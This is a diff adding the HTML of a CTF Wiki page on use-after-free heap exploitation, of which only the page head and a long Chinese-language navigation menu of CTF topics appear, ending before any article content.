@@ -1,0 +1,4999 @@
+
+
+
+
+<!DOCTYPE html>
+<html lang="zh" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      <meta http-equiv="x-ua-compatible" content="ie=edge">
+      
+        <meta name="description" content="CTF Wiki">
+      
+      
+        <link rel="canonical" href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/use_after_free/">
+      
+      
+        <meta name="author" content="CTF Wiki Team">
+      
+      
+        <meta name="lang:clipboard.copy" content="复制">
+      
+        <meta name="lang:clipboard.copied" content="已复制">
+      
+        <meta name="lang:search.language" content="jp">
+      
+        <meta name="lang:search.pipeline.stopwords" content="True">
+      
+        <meta name="lang:search.pipeline.trimmer" content="True">
+      
+        <meta name="lang:search.result.none" content="没有找到符合条件的结果">
+      
+        <meta name="lang:search.result.one" content="找到 1 个符合条件的结果">
+      
+        <meta name="lang:search.result.other" content="# 个符合条件的结果">
+      
+        <meta name="lang:search.tokenizer" content="[\uff0c\u3002]+">
+      
+      <link rel="shortcut icon" href="../../../..">
+      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-3.0.4">
+    
+    
+      
+        <title>Use After Free - CTF Wiki</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../assets/stylesheets/application.451f80e5.css">
+      
+        <link rel="stylesheet" href="../../../../assets/stylesheets/application-palette.22915126.css">
+      
+      
+        
+        
+        <meta name="theme-color" content="">
+      
+    
+    
+      <script src="../../../../assets/javascripts/modernizr.1aa3b519.js"></script>
+    
+    
+      
+        <link href="https://gstatic.loli.net" rel="preconnect" crossorigin>
+        <link rel="stylesheet" href="https://fonts.loli.net/css?family=Fira+Sans:300,400,400i,700|Fira+Mono">
+        <style>body,input{font-family:"Fira Sans","Helvetica Neue",Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Fira Mono","Courier New",Courier,monospace}</style>
+      
+    
+    <link rel="stylesheet" href="../../../../assets/fonts/material-icons.css">
+    
+      <link rel="stylesheet" href="../../../../_static/css/extra.css">
+    
+    
+  </head>
+  
+    
+    
+    <body dir="ltr" data-md-color-primary="white" data-md-color-accent="red">
+  
+    <svg class="md-svg">
+      <defs>
+        
+        
+          <svg xmlns="http://www.w3.org/2000/svg" width="416" height="448"
+    viewBox="0 0 416 448" id="__github">
+  <path fill="currentColor" d="M160 304q0 10-3.125 20.5t-10.75 19-18.125
+        8.5-18.125-8.5-10.75-19-3.125-20.5 3.125-20.5 10.75-19 18.125-8.5
+        18.125 8.5 10.75 19 3.125 20.5zM320 304q0 10-3.125 20.5t-10.75
+        19-18.125 8.5-18.125-8.5-10.75-19-3.125-20.5 3.125-20.5 10.75-19
+        18.125-8.5 18.125 8.5 10.75 19 3.125 20.5zM360
+        304q0-30-17.25-51t-46.75-21q-10.25 0-48.75 5.25-17.75 2.75-39.25
+        2.75t-39.25-2.75q-38-5.25-48.75-5.25-29.5 0-46.75 21t-17.25 51q0 22 8
+        38.375t20.25 25.75 30.5 15 35 7.375 37.25 1.75h42q20.5 0
+        37.25-1.75t35-7.375 30.5-15 20.25-25.75 8-38.375zM416 260q0 51.75-15.25
+        82.75-9.5 19.25-26.375 33.25t-35.25 21.5-42.5 11.875-42.875 5.5-41.75
+        1.125q-19.5 0-35.5-0.75t-36.875-3.125-38.125-7.5-34.25-12.875-30.25-20.25-21.5-28.75q-15.5-30.75-15.5-82.75
+        0-59.25 34-99-6.75-20.5-6.75-42.5 0-29 12.75-54.5 27 0 47.5 9.875t47.25
+        30.875q36.75-8.75 77.25-8.75 37 0 70 8 26.25-20.5
+        46.75-30.25t47.25-9.75q12.75 25.5 12.75 54.5 0 21.75-6.75 42 34 40 34
+        99.5z" />
+</svg>
+        
+      </defs>
+    </svg>
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" data-md-component="overlay" for="__drawer"></label>
+    
+      <a href="../../../../#use-after-free" tabindex="1" class="md-skip">
+        跳转至
+      </a>
+    
+    
+      <header class="md-header" data-md-component="header">
+  <nav class="md-header-nav md-grid">
+    <div class="md-flex">
+      <div class="md-flex__cell md-flex__cell--shrink">
+        <a href="https://ctf-wiki.github.io/ctf-wiki/" title="CTF Wiki" class="md-header-nav__button md-logo">
+          
+            <i class="md-icon">school</i>
+          
+        </a>
+      </div>
+      <div class="md-flex__cell md-flex__cell--shrink">
+        <label class="md-icon md-icon--menu md-header-nav__button" for="__drawer"></label>
+      </div>
+      <div class="md-flex__cell md-flex__cell--stretch">
+        <div class="md-flex__ellipsis md-header-nav__title" data-md-component="title">
+          
+            
+              <span class="md-header-nav__topic">
+                CTF Wiki
+              </span>
+              <span class="md-header-nav__topic">
+                Use After Free
+              </span>
+            
+          
+        </div>
+      </div>
+      <div class="md-flex__cell md-flex__cell--shrink">
+        
+          
+            <label class="md-icon md-icon--search md-header-nav__button" for="__search"></label>
+            
+<div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="query" data-md-state="active">
+      <label class="md-icon md-search__icon" for="__search"></label>
+      <button type="reset" class="md-icon md-search__icon" data-md-component="reset" tabindex="-1">
+        &#xE5CD;
+      </button>
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="result">
+          <div class="md-search-result__meta">
+            键入以开始搜索
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+          
+        
+      </div>
+      
+        <div class="md-flex__cell md-flex__cell--shrink">
+          <div class="md-header-nav__source">
+            
+
+
+  
+
+
+  <a href="https://github.com/ctf-wiki/ctf-wiki/" title="前往 Github 仓库" class="md-source" data-md-source="github">
+    
+      <div class="md-source__icon">
+        <svg viewBox="0 0 24 24" width="24" height="24">
+          <use xlink:href="#__github" width="24" height="24"></use>
+        </svg>
+      </div>
+    
+    <div class="md-source__repository">
+      ctf-wiki/ctf-wiki
+    </div>
+  </a>
+
+          </div>
+        </div>
+      
+    </div>
+  </nav>
+</header>
+    
+    <div class="md-container">
+      
+        
+      
+      
+        
+
+  
+
+<nav class="md-tabs md-tabs--active" data-md-component="tabs">
+  <div class="md-tabs__inner md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../../.." title="Introduction" class="md-tabs__link">
+          Introduction
+        </a>
+      
+    </li>
+  
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../../../misc/introduction/" title="Misc" class="md-tabs__link">
+          Misc
+        </a>
+      
+    </li>
+  
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../../../crypto/introduction/" title="Crypto" class="md-tabs__link">
+          Crypto
+        </a>
+      
+    </li>
+  
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../../../web/introduction/" title="Web" class="md-tabs__link">
+          Web
+        </a>
+      
+    </li>
+  
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../../../assembly/x86-x64/readme/" title="Assembly" class="md-tabs__link">
+          Assembly
+        </a>
+      
+    </li>
+  
+
+      
+        
+  
+  
+    
+    
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../../../executable/elf/elf_structure/" title="Executable" class="md-tabs__link">
+          Executable
+        </a>
+      
+    </li>
+  
+
+  
+
+      
+        
+  
+  
+    
+    
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../../../reverse/introduction/" title="Reverse" class="md-tabs__link">
+          Reverse
+        </a>
+      
+    </li>
+  
+
+  
+
+      
+        
+  
+  
+    
+    
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../../readme/" title="Pwn" class="md-tabs__link">
+          Pwn
+        </a>
+      
+    </li>
+  
+
+  
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../../../android/basic_develop/basic_develop/" title="Android" class="md-tabs__link">
+          Android
+        </a>
+      
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+      
+      <main class="md-main">
+        <div class="md-main__inner md-grid" data-md-component="container">
+          
+            
+              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    <nav class="md-nav md-nav--primary" data-md-level="0">
+  <label class="md-nav__title md-nav__title--site" for="__drawer">
+    <a href="https://ctf-wiki.github.io/ctf-wiki/" title="CTF Wiki" class="md-nav__button md-logo">
+      
+        <i class="md-icon">school</i>
+      
+    </a>
+    CTF Wiki
+  </label>
+  
+    <div class="md-nav__source">
+      
+
+
+  
+
+
+  <a href="https://github.com/ctf-wiki/ctf-wiki/" title="前往 Github 仓库" class="md-source" data-md-source="github">
+    
+      <div class="md-source__icon">
+        <svg viewBox="0 0 24 24" width="24" height="24">
+          <use xlink:href="#__github" width="24" height="24"></use>
+        </svg>
+      </div>
+    
+    <div class="md-source__repository">
+      ctf-wiki/ctf-wiki
+    </div>
+  </a>
+
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-1" type="checkbox" id="nav-1">
+    
+    <label class="md-nav__link" for="nav-1">
+      Introduction
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-1">
+        Introduction
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../.." title="Getting Started" class="md-nav__link">
+      Getting Started
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../introduction/history/" title="CTF 历史" class="md-nav__link">
+      CTF 历史
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../introduction/mode/" title="CTF 竞赛模式简介" class="md-nav__link">
+      CTF 竞赛模式简介
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../introduction/content/" title="CTF 竞赛内容" class="md-nav__link">
+      CTF 竞赛内容
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../introduction/experience/" title="线下攻防经验小结" class="md-nav__link">
+      线下攻防经验小结
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../introduction/cgc/" title="CGC 超级挑战赛" class="md-nav__link">
+      CGC 超级挑战赛
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../introduction/resources/" title="学习资源" class="md-nav__link">
+      学习资源
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2">
+    
+    <label class="md-nav__link" for="nav-2">
+      Misc
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-2">
+        Misc
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../misc/introduction/" title="杂项简介" class="md-nav__link">
+      杂项简介
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../misc/recon/" title="信息搜集技术" class="md-nav__link">
+      信息搜集技术
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-3" type="checkbox" id="nav-2-3">
+    
+    <label class="md-nav__link" for="nav-2-3">
+      编码分析
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-2-3">
+        编码分析
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../misc/encode/communication/" title="通信领域常用编码" class="md-nav__link">
+      通信领域常用编码
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../misc/encode/computer/" title="计算机相关的编码" class="md-nav__link">
+      计算机相关的编码
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../misc/encode/modern/" title="现实世界中常用的编码" class="md-nav__link">
+      现实世界中常用的编码
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../misc/prefix/" title="取证隐写前置技术" class="md-nav__link">
+      取证隐写前置技术
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-5" type="checkbox" id="nav-2-5">
+    
+    <label class="md-nav__link" for="nav-2-5">
+      图片分析
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-2-5">
+        图片分析
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../misc/picture/introduction/" title="图片分析简介" class="md-nav__link">
+      图片分析简介
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../misc/picture/png/" title="PNG" class="md-nav__link">
+      PNG
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../misc/picture/jpg/" title="JPG" class="md-nav__link">
+      JPG
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../misc/picture/gif/" title="GIF" class="md-nav__link">
+      GIF
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-6" type="checkbox" id="nav-2-6">
+    
+    <label class="md-nav__link" for="nav-2-6">
+      流量包分析
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-2-6">
+        流量包分析
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../misc/traffic/introduction/" title="流量包分析简介" class="md-nav__link">
+      流量包分析简介
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../misc/traffic/fix/" title="PCAP 文件修复" class="md-nav__link">
+      PCAP 文件修复
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../misc/traffic/protocols/" title="协议分析" class="md-nav__link">
+      协议分析
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../misc/traffic/data/" title="数据提取" class="md-nav__link">
+      数据提取
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-7" type="checkbox" id="nav-2-7">
+    
+    <label class="md-nav__link" for="nav-2-7">
+      压缩包分析
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-2-7">
+        压缩包分析
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../misc/archive/zip/" title="ZIP 格式" class="md-nav__link">
+      ZIP 格式
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../misc/archive/rar/" title="RAR 格式" class="md-nav__link">
+      RAR 格式
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../misc/audio/introduction/" title="音频隐写" class="md-nav__link">
+      音频隐写
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-9" type="checkbox" id="nav-2-9">
+    
+    <label class="md-nav__link" for="nav-2-9">
+      磁盘内存分析
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-2-9">
+        磁盘内存分析
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../misc/disk-memory/introduction/" title="介绍" class="md-nav__link">
+      介绍
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../misc/disk-memory/problem/" title="题目" class="md-nav__link">
+      题目
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-10" type="checkbox" id="nav-2-10">
+    
+    <label class="md-nav__link" for="nav-2-10">
+      Other
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-2-10">
+        Other
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../misc/other/pyc/" title="pyc文件" class="md-nav__link">
+      pyc文件
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3" type="checkbox" id="nav-3">
+    
+    <label class="md-nav__link" for="nav-3">
+      Crypto
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-3">
+        Crypto
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../crypto/introduction/" title="密码学简介" class="md-nav__link">
+      密码学简介
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-2" type="checkbox" id="nav-3-2">
+    
+    <label class="md-nav__link" for="nav-3-2">
+      基础数学知识
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-3-2">
+        基础数学知识
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../crypto/basic/introduction/" title="简介" class="md-nav__link">
+      简介
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-3" type="checkbox" id="nav-3-3">
+    
+    <label class="md-nav__link" for="nav-3-3">
+      古典密码
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-3-3">
+        古典密码
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../crypto/classical/introduction/" title="古典密码简介" class="md-nav__link">
+      古典密码简介
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../crypto/classical/monoalphabetic/" title="单表代换加密" class="md-nav__link">
+      单表代换加密
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../crypto/classical/polyalphabetic/" title="多表代换加密" class="md-nav__link">
+      多表代换加密
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../crypto/classical/others/" title="其他类型加密" class="md-nav__link">
+      其他类型加密
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../crypto/classical/summary/" title="总结" class="md-nav__link">
+      总结
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-4" type="checkbox" id="nav-3-4">
+    
+    <label class="md-nav__link" for="nav-3-4">
+      流密码
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-3-4">
+        流密码
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../crypto/streamcipher/intro/" title="介绍" class="md-nav__link">
+      介绍
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-4-2" type="checkbox" id="nav-3-4-2">
+    
+    <label class="md-nav__link" for="nav-3-4-2">
+      伪随机数生成器
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
+      <label class="md-nav__title" for="nav-3-4-2">
+        伪随机数生成器
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../crypto/streamcipher/prng/intro/" title="介绍" class="md-nav__link">
+      介绍
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../crypto/streamcipher/prng/csprng/" title="密码学安全伪随机数生成器" class="md-nav__link">
+      密码学安全伪随机数生成器
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../crypto/streamcipher/prng/problem/" title="题目" class="md-nav__link">
+      题目
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-4-3" type="checkbox" id="nav-3-4-3">
+    
+    <label class="md-nav__link" for="nav-3-4-3">
+      线性同余生成器
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
+      <label class="md-nav__title" for="nav-3-4-3">
+        线性同余生成器
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../crypto/streamcipher/lcg/intro/" title="简介" class="md-nav__link">
+      简介
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../crypto/streamcipher/lcg/challenge/" title="例题" class="md-nav__link">
+      例题
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-4-4" type="checkbox" id="nav-3-4-4">
+    
+    <label class="md-nav__link" for="nav-3-4-4">
+      反馈移位寄存器
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
+      <label class="md-nav__title" for="nav-3-4-4">
+        反馈移位寄存器
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../crypto/streamcipher/fsr/intro/" title="介绍" class="md-nav__link">
+      介绍
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../crypto/streamcipher/fsr/lfsr/" title="线性反馈移位寄存器" class="md-nav__link">
+      线性反馈移位寄存器
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../crypto/streamcipher/fsr/nfsr/" title="非线性反馈移位寄存器" class="md-nav__link">
+      非线性反馈移位寄存器
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-4-5" type="checkbox" id="nav-3-4-5">
+    
+    <label class="md-nav__link" for="nav-3-4-5">
+      特殊流密码
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
+      <label class="md-nav__title" for="nav-3-4-5">
+        特殊流密码
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../crypto/streamcipher/special/rc4/" title="RC4" class="md-nav__link">
+      RC4
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-5" type="checkbox" id="nav-3-5">
+    
+    <label class="md-nav__link" for="nav-3-5">
+      块加密
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-3-5">
+        块加密
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../crypto/blockcipher/introduction/" title="块加密简介" class="md-nav__link">
+      块加密简介
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../crypto/blockcipher/arx-operations/" title="ARX" class="md-nav__link">
+      ARX
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../crypto/blockcipher/des/" title="DES" class="md-nav__link">
+      DES
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../crypto/blockcipher/idea/" title="IDEA" class="md-nav__link">
+      IDEA
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../crypto/blockcipher/aes/" title="AES" class="md-nav__link">
+      AES
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../crypto/blockcipher/simon-speck/" title="Simon and Speck" class="md-nav__link">
+      Simon and Speck
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-5-7" type="checkbox" id="nav-3-5-7">
+    
+    <label class="md-nav__link" for="nav-3-5-7">
+      分组模式
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
+      <label class="md-nav__title" for="nav-3-5-7">
+        分组模式
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../crypto/blockcipher/mode/introduction/" title="介绍" class="md-nav__link">
+      介绍
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../crypto/blockcipher/mode/padding/" title="填充方式" class="md-nav__link">
+      填充方式
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../crypto/blockcipher/mode/ecb/" title="ECB" class="md-nav__link">
+      ECB
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../crypto/blockcipher/mode/cbc/" title="CBC" class="md-nav__link">
+      CBC
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../crypto/blockcipher/mode/pcbc/" title="PCBC" class="md-nav__link">
+      PCBC
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../crypto/blockcipher/mode/cfb/" title="CFB" class="md-nav__link">
+      CFB
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../crypto/blockcipher/mode/ofb/" title="OFB" class="md-nav__link">
+      OFB
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../crypto/blockcipher/mode/ctr/" title="CTR" class="md-nav__link">
+      CTR
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../crypto/blockcipher/mode/padding-oracle-attack/" title="Padding Oracle Attack" class="md-nav__link">
+      Padding Oracle Attack
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-6" type="checkbox" id="nav-3-6">
+    
